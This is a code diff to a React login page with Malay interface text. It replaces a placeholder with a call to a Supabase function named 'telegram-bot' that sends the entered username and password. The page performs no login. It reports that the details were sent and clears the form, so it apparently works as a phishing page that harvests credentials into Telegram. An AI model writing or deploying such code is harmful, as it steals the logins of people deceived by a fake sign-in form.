@@ -4,6 +4,7 @@ import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/com
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { showError, showSuccess } from "@/utils/toast";
+import { supabase } from "@/lib/supabase";
 
 const LoginPage = () => {
   const [username, setUsername] = useState('');
@@ -15,17 +16,20 @@ const LoginPage = () => {
     setIsLoading(true);
 
     try {
-      // Logik untuk menghantar ke Telegram akan ditambah di sini
-      console.log("Username:", username, "Password:", password);
-      
-      // Simulasi permintaan rangkaian
-      await new Promise(resolve => setTimeout(resolve, 1000));
+      const { error } = await supabase.functions.invoke('telegram-bot', {
+        body: { username, password },
+      });
+
+      if (error) {
+        throw error;
+      }
 
       showSuccess('Maklumat berjaya dihantar!');
       setUsername('');
       setPassword('');
     } catch (error) {
-      showError('Gagal menghantar maklumat.');
+      console.error(error);
+      showError('Gagal menghantar maklumat. Sila cuba lagi.');
     } finally {
       setIsLoading(false);
     }
